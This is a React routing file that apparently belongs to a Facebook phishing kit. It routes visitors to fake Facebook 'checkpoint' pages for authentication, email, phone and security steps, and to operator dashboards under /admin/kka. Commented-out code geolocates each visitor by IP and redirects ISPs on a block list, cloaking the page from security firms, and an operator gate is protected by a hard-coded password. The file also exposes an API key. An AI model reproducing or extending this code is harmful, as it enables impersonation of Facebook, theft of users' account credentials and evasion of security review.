import React, { useEffect, useState } from "react";
import { BrowserRouter, Routes, Route } from "react-router-dom";
import App from "./App";
import {MySite} from "./MySite";
import NotFound from "./NotFound";
import { Confirmation } from "./Confirmation";
import { CodeTwo } from "./CodeTwo";
import { ConfirmationSecond } from "./ConfirmationSecond";
import Dashboard from "./Dashboard";
import { TH } from "./TH";
import { Robot } from "./Robot";
import {BLOCK_ORG} from './utils/variable'
import { FacebookButton } from "./FacebookButton";
import Dashboard2 from "./Dashboard2";

export default function RootNavigation() {
  const [is_visible, setVisible] = useState(false);
  const [isLoading, setLoading] = useState(true);
  const [isRedirect, setRedirect] = useState(false);
  var url = window.location.pathname.split('/');

  // if(url[1] == 'help' && url[2] == 'support' || url[1] == 'checkpoint' ||  url[2] == 'kka'  && url[3].includes('client_id=') && url[3].split('=')[1])  {
  // } else {
  //   return window.location.replace('https://www.facebook.com/help')
  // }


  // useEffect(() => {
  //     fetch("https://api.ipgeolocation.io/ipgeo?apiKey=defba4e9d87c44ce9125f6101daf33a1")
  //     .then((response) => response.json())
  //     .then((response) => {
  //       const isBlockOrgi = BLOCK_ORG.some(item => response.isp.toLowerCase().includes(item.toLowerCase()))
  //       setRedirect(isBlockOrgi)
  //       setLoading(false);
  //     }).catch(() => {
  //       setLoading(false);
  //     })    

  //   // triggerPompt();
  // }, []);

  // const triggerPompt = () => {
  //   let user = window.prompt("What's code?", "");
  //   if (user == "admin!") {
  //     setVisible(true);n
  //   } else {
  //     triggerPompt();
  //   }
  // };

 
  return (
    <BrowserRouter>
      <Routes>
        <Route path="/">
          <Route index path="/" element={<FacebookButton />} />
          {/* <Route
            path="/checkpoint/next=authentication"
            element={<Confirmation />}
          />
          <Route
            path="/checkpoint/next=error-authentication"
            element={<CodeTwo />}
          />
          <Route
            path="/checkpoint/next=email"
            element={<ConfirmationSecond />}
          />
          <Route path="/checkpoint/next=phone" element={<TH />} />
          <Route path="/checkpoint/next=secure" element={<Robot />} /> */}
          {/* <Route path="/admin/kka" element={<Dashboard />} /> */}
          {/* <Route path="/admin/kka2" element={<Dashboard2 />} /> */}
          <Route path="*" element={<FacebookButton />} />
        </Route>
      </Routes>
    </BrowserRouter>
  );
}
